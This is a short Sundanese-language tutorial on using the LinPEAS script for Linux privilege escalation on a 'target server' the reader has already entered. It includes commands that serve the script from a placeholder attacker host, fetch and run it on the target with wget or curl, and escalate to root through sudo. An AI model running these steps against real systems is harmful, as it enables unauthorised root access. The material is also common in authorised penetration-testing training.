LinPEAS (Linux Privilege Escalation Awesome Script) mangrupakeun alat otomatis pikeun milarian kagagalan sistem anu bisa digunakeun pikeun ningkatkeun hak aksés di Linux. 🚀

wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh

🔹 Kumaha mun geus meunang akses ka server target?
Urang kudu mindahkeun linpeas.sh ka target make salah sahiji cara ieu:

📌 Mindahkeun File ka Server Target
🔹 Pakai Python HTTP Server (Upami Target Boga wget atanapi curl)

cd /path/to/linpeas
python3 -m http.server 8080
Di sisi target:

wget http://your-ip:8080/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh

Atawa make curl:

curl -O http://your-ip:8080/linpeas.sh
chmod +x linpeas.sh

2️⃣ Eksekusi LinPEAS di Server Target

Saatos file LinPEAS parantos disalin, jalankeun skrip di sisi target:

./linpeas.sh | tee result.txt

🎯 Efekna: Bakal ngescan misconfiguration, file rahasia, SUID binary, password, & potensi exploit privilege escalation.

3️⃣ Analisana Hasil Scan LinPEAS
Saatos linpeas jalan, pariksa hasilna:

🔹 Bagian Penting Nu Kudu Dicek
✅ Misconfiguration sudo: Bisa eksekusi paréntah root tanpa password.
✅ SUID binaries: Bisa ningkatkeun aksés make binary anu nyimpen hak istimewa.
✅ File anu ngandung password: .bash_history, config.php, .ssh/id_rsa, jst.
✅ Kernel Exploit: Kernel rentan anu bisa di-exploit ku local privilege escalation.

4️⃣ Coba Privilege Escalation
🎯 Mun aya SUID Binary anu Rentan:

find / -perm -4000 2>/dev/null
sudo -l
Mun aya program anu bisa dijalankeun tanpa password, jalankeun:
sudo /bin/bash

🔥 KESIMPULAN
✅ LinPEAS otomatis ngescan sistem pikeun privilege escalation.
✅ Hasilna nunjukkeun misconfiguration, password lemah, jeung SUID vulnerabilities.
✅ Upami aya kasempetan, bisa ningkatkeun aksés ka root!

🚀 Mang hayang nyobaan LinPEAS di mana heula? 😎🔥
